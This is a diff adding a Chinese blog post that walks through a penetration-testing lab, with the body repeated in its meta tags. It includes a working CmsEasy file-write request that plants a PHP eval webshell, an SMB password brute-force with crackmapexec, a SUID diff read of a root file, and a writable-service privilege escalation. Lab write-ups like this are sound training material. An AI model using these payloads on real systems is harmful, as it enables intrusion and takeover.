@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+# 外网
+
+依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.146.141
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.146.141:80 open
+39.99.146.141:22 open
+39.99.146.141:21 open
+39.99.146.141:3306 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://39.99.146.141      code:200 len:68108  title:中文网页标题
+```
+
+这里可以先尝试ftp匿名登陆，但是实际登不上去，这个版本的vsftpd有漏洞但是只是瘫痪服务
+
+web弱密码admin/123456能上去
+
+在登陆前首页扒拉到`CmsEasy 7_7_5_20210919_UTF8`，看着像是7.7.5版本，这个版本确实有个poc
+https://note-hxlab.wetolink.com/share/msJH69Y06ZlS
+但是实际测试有问题，马写不进去，而且有过滤，这个poc可以
+[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
+
+```bash
+POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
+Host: 39.99.146.141
+Content-Length: 85
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded;
+Cookie: PHPSESSID=77a1ggekksec3shvure3e5gl2k; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<%3fphp+%40eval($_GET[1])%3b%3f>
+
+```
+直接写马即可，这种小众的cms漏洞poc真的难找，接着上线下vshell就行
+
+
+flag只有root可读
+```bash
+www-data@localhost:/home/flag$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 13 09:19 .
+drwxr-xr-x 3 root root 4096 Jun 22  2022 ..
+-r-------- 1 root root  798 Sep 13 09:19 flag01.txt
+```
+
+s位，不过实际上云镜的linux都直接copy-fail一把梭就拿下了
+
+```bash
+www-data@localhost:/home/flag$ find / -perm -4000 2>/dev/null
+/usr/bin/stapbpf
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/staprun
+/usr/bin/at
+/usr/bin/diff
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+www-data@localhost:/home/flag$ diff --line-format=%L /dev/null flag01.txt
+  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
+ |  _'\ \| ___'|/ |'|    \| ___'|/U /'___|uU  /'\  u  |_ ' _|     ___     \/'_ \/ | \ |'|    
+/| | | | |  _|' U | | u   |  _|'  \| |  _ / \/ _ \/     | |      |_'_|    | | | |<|  \| |>   
+U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
+ |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
+  |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
+ (__)_) (__) (__)(_')('_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_')  (_/  
+
+flag01: flag{8df5a1f4-1238-43ea-a3c8-f4be66bb2c6a}
+
+Great job!!!!!!
+
+Here is the hint: WIN19\Adrian
+
+I'll do whatever I can to rock you...
+www-data@localhost:/home/flag$
+ 
+```
+
+# 内网
+
+flag1 hint了WIN19\Adrian这个账户，外网这台有数据库找一下密码练上去可以查查其实，可能有密码复用，但是这里没有
+
+fscan的时候最好还是不要排除外网主机了，不然它不扫poc和爆破，这版本有点小毛病
+
+```
+root@localhost:~# fscan -h 172.22.4.36/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.4.36     is alive
+(icmp) Target 172.22.4.7      is alive
+(icmp) Target 172.22.4.19     is alive
+(icmp) Target 172.22.4.45     is alive
+[*] Icmp alive hosts len is: 4
+172.22.4.45:80 open
+172.22.4.36:22 open
+172.22.4.36:21 open
+172.22.4.36:80 open
+172.22.4.7:88 open
+172.22.4.36:3306 open
+172.22.4.45:445 open
+172.22.4.19:445 open
+172.22.4.7:445 open
+172.22.4.45:139 open
+172.22.4.19:139 open
+172.22.4.7:139 open
+172.22.4.19:135 open
+172.22.4.45:135 open
+172.22.4.7:135 open
+[*] alive ports len is: 15
+start vulscan
+[*] NetInfo
+[*]172.22.4.19
+   [->]FILESERVER
+   [->]172.22.4.19
+[*] NetInfo
+[*]172.22.4.45
+   [->]WIN19
+   [->]172.22.4.45
+[*] NetInfo
+[*]172.22.4.7
+   [->]DC01
+   [->]172.22.4.7
+[*] NetBios 172.22.4.45     XIAORANG\WIN19
+[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
+[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
+[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
+[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
+```
+
+|IP|主机名|FQDN / NetBIOS|系统信息|角色判断|开放端口|
+|---|---|---|---|---|---|
+|172.22.4.7|DC01|DC01.xiaorang.lab / DC:DC01|Windows Server 2016 Datacenter 14393|域控 DC|88, 135, 139, 445|
+|172.22.4.19|FILESERVER|FILESERVER.xiaorang.lab|Windows Server 2016 Standard 14393|文件服务器|135, 139, 445|
+|172.22.4.45|WIN19|XIAORANG\WIN19|未明确显示系统版本|成员服务器 / IIS Web|80, 135, 139, 445|
+
+# WIN19
+
+根据hint接下来要打WIN19了，爆破密码就行
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt --local-auth
+```
+能得到密码是babygirl1，过期的连上需要改
+
+桌面上有PrivescCheck，这是个windows提权枚举工具，里面也有检测结果，在PrivescCheck_WIN19.html
+
+```
+Name              : gupdate
+ImagePath         : 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe' /svc
+User              : LocalSystem
+ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
+IdentityReference : BUILTIN\Users
+Permissions       : WriteDAC, ..., SetValue, CreateSubKey, ...
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+```
+**含义**：`BUILTIN\Users`（Adrian 属于这个组）对 `gupdate` 服务的注册表键有 **SetValue / CreateSubKey / WriteDAC** 权限，而该服务以 **LocalSystem** 运行，并且 **当前用户能启动它**。">
+<meta property="og:title" content="Delegation">
+<meta property="og:description" content="
+# 外网
+
+依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.99.146.141
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.146.141:80 open
+39.99.146.141:22 open
+39.99.146.141:21 open
+39.99.146.141:3306 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://39.99.146.141      code:200 len:68108  title:中文网页标题
+```
+
+这里可以先尝试ftp匿名登陆，但是实际登不上去，这个版本的vsftpd有漏洞但是只是瘫痪服务
+
+web弱密码admin/123456能上去
+
+在登陆前首页扒拉到`CmsEasy 7_7_5_20210919_UTF8`，看着像是7.7.5版本，这个版本确实有个poc
+https://note-hxlab.wetolink.com/share/msJH69Y06ZlS
+但是实际测试有问题，马写不进去，而且有过滤，这个poc可以
+[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
+
+```bash
+POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
+Host: 39.99.146.141
+Content-Length: 85
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded;
+Cookie: PHPSESSID=77a1ggekksec3shvure3e5gl2k; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<%3fphp+%40eval($_GET[1])%3b%3f>
+
+```
+直接写马即可，这种小众的cms漏洞poc真的难找，接着上线下vshell就行
+
+
+flag只有root可读
+```bash
+www-data@localhost:/home/flag$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 13 09:19 .
+drwxr-xr-x 3 root root 4096 Jun 22  2022 ..
+-r-------- 1 root root  798 Sep 13 09:19 flag01.txt
+```
+
+s位，不过实际上云镜的linux都直接copy-fail一把梭就拿下了
+
+```bash
+www-data@localhost:/home/flag$ find / -perm -4000 2>/dev/null
+/usr/bin/stapbpf
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/staprun
+/usr/bin/at
+/usr/bin/diff
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+www-data@localhost:/home/flag$ diff --line-format=%L /dev/null flag01.txt
+  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
+ |  _'\ \| ___'|/ |'|    \| ___'|/U /'___|uU  /'\  u  |_ ' _|     ___     \/'_ \/ | \ |'|    
+/| | | | |  _|' U | | u   |  _|'  \| |  _ / \/ _ \/     | |      |_'_|    | | | |<|  \| |>   
+U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
+ |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
+  |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
+ (__)_) (__) (__)(_')('_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_')  (_/  
+
+flag01: flag{8df5a1f4-1238-43ea-a3c8-f4be66bb2c6a}
+
+Great job!!!!!!
+
+Here is the hint: WIN19\Adrian
+
+I'll do whatever I can to rock you...
+www-data@localhost:/home/flag$
+ 
+```
+
+# 内网
+
+flag1 hint了WIN19\Adrian这个账户，外网这台有数据库找一下密码练上去可以查查其实，可能有密码复用，但是这里没有
+
+fscan的时候最好还是不要排除外网主机了，不然它不扫poc和爆破，这版本有点小毛病
+
+```
+root@localhost:~# fscan -h 172.22.4.36/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.4.36     is alive
+(icmp) Target 172.22.4.7      is alive
+(icmp) Target 172.22.4.19     is alive
+(icmp) Target 172.22.4.45     is alive
+[*] Icmp alive hosts len is: 4
+172.22.4.45:80 open
+172.22.4.36:22 open
+172.22.4.36:21 open
+172.22.4.36:80 open
+172.22.4.7:88 open
+172.22.4.36:3306 open
+172.22.4.45:445 open
+172.22.4.19:445 open
+172.22.4.7:445 open
+172.22.4.45:139 open
+172.22.4.19:139 open
+172.22.4.7:139 open
+172.22.4.19:135 open
+172.22.4.45:135 open
+172.22.4.7:135 open
+[*] alive ports len is: 15
+start vulscan
+[*] NetInfo
+[*]172.22.4.19
+   [->]FILESERVER
+   [->]172.22.4.19
+[*] NetInfo
+[*]172.22.4.45
+   [->]WIN19
+   [->]172.22.4.45
+[*] NetInfo
+[*]172.22.4.7
+   [->]DC01
+   [->]172.22.4.7
+[*] NetBios 172.22.4.45     XIAORANG\WIN19
+[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
+[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
+[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
+[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
+```
+
+|IP|主机名|FQDN / NetBIOS|系统信息|角色判断|开放端口|
+|---|---|---|---|---|---|
+|172.22.4.7|DC01|DC01.xiaorang.lab / DC:DC01|Windows Server 2016 Datacenter 14393|域控 DC|88, 135, 139, 445|
+|172.22.4.19|FILESERVER|FILESERVER.xiaorang.lab|Windows Server 2016 Standard 14393|文件服务器|135, 139, 445|
+|172.22.4.45|WIN19|XIAORANG\WIN19|未明确显示系统版本|成员服务器 / IIS Web|80, 135, 139, 445|
+
+# WIN19
+
+根据hint接下来要打WIN19了，爆破密码就行
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt --local-auth
+```
+能得到密码是babygirl1，过期的连上需要改
+
+桌面上有PrivescCheck，这是个windows提权枚举工具，里面也有检测结果，在PrivescCheck_WIN19.html
+
+```
+Name              : gupdate
+ImagePath         : 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe' /svc
+User              : LocalSystem
+ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
+IdentityReference : BUILTIN\Users
+Permissions       : WriteDAC, ..., SetValue, CreateSubKey, ...
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+```
+**含义**：`BUILTIN\Users`（Adrian 属于这个组）对 `gupdate` 服务的注册表键有 **SetValue / CreateSubKey / WriteDAC** 权限，而该服务以 **LocalSystem** 运行，并且 **当前用户能启动它**。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Delegation.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Delegation</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Delegation</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/44" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>外网</h1>
+<p>依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─<span class="pl-c"><span class="pl-c">#</span> fscan -h 39.99.146.141</span>
+
+   ___                              _
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">39.99.146.141:80 open</span>
+<span class="pl-s">39.99.146.141:22 open</span>
+<span class="pl-s">39.99.146.141:21 open</span>
+<span class="pl-s">39.99.146.141:3306 open</span>
+<span class="pl-s">[*] alive ports len is: 4</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[*] WebTitle http://39.99.146.141      code:200 len:68108  title:中文网页标题</span></pre></div>
+<p>这里可以先尝试ftp匿名登陆，但是实际登不上去，这个版本的vsftpd有漏洞但是只是瘫痪服务</p>
+<p>web弱密码admin/123456能上去</p>
+<p>在登陆前首页扒拉到<code class="notranslate">CmsEasy 7_7_5_20210919_UTF8</code>，看着像是7.7.5版本，这个版本确实有个poc<br>
+<a href="https://note-hxlab.wetolink.com/share/msJH69Y06ZlS" rel="nofollow">https://note-hxlab.wetolink.com/share/msJH69Y06ZlS</a><br>
+但是实际测试有问题，马写不进去，而且有过滤，这个poc可以<br>
+<a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90" rel="nofollow">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr</a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">POST /index.php<span class="pl-k">?</span>case=template<span class="pl-k">&amp;</span>act=save<span class="pl-k">&amp;</span>admin_dir=admin<span class="pl-k">&amp;</span>site=default HTTP/1.1
+Host: 39.99.146.141
+Content-Length: 85
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded<span class="pl-k">;</span>
+Cookie: PHPSESSID=77a1ggekksec3shvure3e5gl2k<span class="pl-k">;</span> loginfalse74c6352c5a281ec5947783b8a186e225=1<span class="pl-k">;</span> login_username=admin<span class="pl-k">;</span> login_password=a14cdfc627cef32c707a7988e70c1313
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+sid=<span class="pl-c"><span class="pl-c">#</span>data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;%3fphp+%40eval($_GET[1])%3b%3f&gt;</span>
+</pre></div>
+<p>直接写马即可，这种小众的cms漏洞poc真的难找，接着上线下vshell就行</p>
+<p>flag只有root可读</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@localhost:/home/flag$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 13 09:19 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root root 4096 Jun 22  2022 ..
+-r-------- 1 root root  798 Sep 13 09:19 flag01.txt</pre></div>
+<p>s位，不过实际上云镜的linux都直接copy-fail一把梭就拿下了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@localhost:/home/flag$ find / -perm -4000 <span class="pl-k">2&gt;</span>/dev/null
+/usr/bin/stapbpf
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/staprun
+/usr/bin/at
+/usr/bin/diff
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+www-data@localhost:/home/flag$ diff --line-format=%L /dev/null flag01.txt
+  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
+ <span class="pl-k">|</span>  _<span class="pl-s"><span class="pl-pds">"</span>\ \| ___<span class="pl-pds">"</span></span><span class="pl-k">|</span>/ <span class="pl-k">|</span><span class="pl-s"><span class="pl-pds">"</span>|    \| ___<span class="pl-pds">"</span></span><span class="pl-k">|</span>/U /<span class="pl-s"><span class="pl-pds">"</span>___|uU  /<span class="pl-pds">"</span></span><span class="pl-cce">\ </span> u  <span class="pl-k">|</span>_ <span class="pl-s"><span class="pl-pds">"</span> _|     ___     \/<span class="pl-pds">"</span></span>_ <span class="pl-cce">\/</span> <span class="pl-k">|</span> <span class="pl-cce">\ </span><span class="pl-k">|</span><span class="pl-s"><span class="pl-pds">"</span>|    </span>
+<span class="pl-s">/| | | | |  _|<span class="pl-pds">"</span></span> U <span class="pl-k">|</span> <span class="pl-k">|</span> u   <span class="pl-k">|</span>  _<span class="pl-k">|</span><span class="pl-s"><span class="pl-pds">"</span>  \| |  _ / \/ _ \/     | |      |_<span class="pl-pds">"</span></span>_<span class="pl-k">|</span>    <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span><span class="pl-k">&lt;</span><span class="pl-k">|</span>  <span class="pl-cce">\|</span> <span class="pl-k">|</span><span class="pl-k">&gt;</span>   
+U<span class="pl-k">|</span> <span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-k">|</span><span class="pl-cce">\|</span> <span class="pl-k">|</span>___  <span class="pl-cce">\|</span> <span class="pl-k">|</span>/__  <span class="pl-k">|</span> <span class="pl-k">|</span>___   <span class="pl-k">|</span> <span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-k">|</span>  / ___ <span class="pl-cce">\ </span>   /<span class="pl-k">|</span> <span class="pl-k">|</span><span class="pl-cce">\ </span>     <span class="pl-k">|</span> <span class="pl-k">|</span> .-,_<span class="pl-k">|</span> <span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-k">|</span>U<span class="pl-k">|</span> <span class="pl-k">|</span><span class="pl-cce">\ </span> <span class="pl-k">|</span>u   
+ <span class="pl-k">|</span>____/ u<span class="pl-k">|</span>_____<span class="pl-k">|</span>  <span class="pl-k">|</span>_____<span class="pl-k">|</span> <span class="pl-k">|</span>_____<span class="pl-k">|</span>   <span class="pl-cce">\_</span>___<span class="pl-k">|</span> /_/   <span class="pl-cce">\_\ </span> u <span class="pl-k">|</span>_<span class="pl-k">|</span>U    U/<span class="pl-k">|</span> <span class="pl-k">|</span><span class="pl-cce">\u\_</span>)-<span class="pl-cce">\_</span>__/  <span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-cce">\_</span><span class="pl-k">|</span>    
+  <span class="pl-k">|||</span>_   <span class="pl-s"><span class="pl-k">&lt;&lt;</span>   <span class="pl-k">&gt;&gt;</span>  //  <span class="pl-cce">\\</span>  &lt;&lt;   &gt;&gt;   _)(|_   <span class="pl-cce">\\</span>    &gt;&gt;  _// <span class="pl-cce">\\</span>_.-,_|___|_,-.  <span class="pl-cce">\\</span>    ||   <span class="pl-cce">\\</span>,-. </span>
+<span class="pl-s"> (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/  </span>
+<span class="pl-s"></span>
+<span class="pl-s">flag01: flag{8df5a1f4-1238-43ea-a3c8-f4be66bb2c6a}</span>
+<span class="pl-s"></span>
+<span class="pl-s">Great job!!!!!!</span>
+<span class="pl-s"></span>
+<span class="pl-s">Here is the hint: WIN19\Adrian</span>
+<span class="pl-s"></span>
+<span class="pl-s">I'll do whatever I can to rock you...</span>
+<span class="pl-s">www-data@localhost:/home/flag$</span>
+<span class="pl-s"> </span></pre></div>
+<h1>内网</h1>
+<p>flag1 hint了WIN19\Adrian这个账户，外网这台有数据库找一下密码练上去可以查查其实，可能有密码复用，但是这里没有</p>
+<p>fscan的时候最好还是不要排除外网主机了，不然它不扫poc和爆破，这版本有点小毛病</p>
+<pre class="notranslate"><code class="notranslate">root@localhost:~# fscan -h 172.22.4.36/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.4.36     is alive
+(icmp) Target 172.22.4.7      is alive
+(icmp) Target 172.22.4.19     is alive
+(icmp) Target 172.22.4.45     is alive
+[*] Icmp alive hosts len is: 4
+172.22.4.45:80 open
+172.22.4.36:22 open
+172.22.4.36:21 open
+172.22.4.36:80 open
+172.22.4.7:88 open
+172.22.4.36:3306 open
+172.22.4.45:445 open
+172.22.4.19:445 open
+172.22.4.7:445 open
+172.22.4.45:139 open
+172.22.4.19:139 open
+172.22.4.7:139 open
+172.22.4.19:135 open
+172.22.4.45:135 open
+172.22.4.7:135 open
+[*] alive ports len is: 15
+start vulscan
+[*] NetInfo
+[*]172.22.4.19
+   [-&gt;]FILESERVER
+   [-&gt;]172.22.4.19
+[*] NetInfo
+[*]172.22.4.45
+   [-&gt;]WIN19
+   [-&gt;]172.22.4.45
+[*] NetInfo
+[*]172.22.4.7
+   [-&gt;]DC01
+   [-&gt;]172.22.4.7
+[*] NetBios 172.22.4.45     XIAORANG\WIN19
+[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
+[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
+[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
+[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
+[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
+</code></pre>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th>IP</th>
+<th>主机名</th>
+<th>FQDN / NetBIOS</th>
+<th>系统信息</th>
+<th>角色判断</th>
+<th>开放端口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>172.22.4.7</td>
+<td>DC01</td>
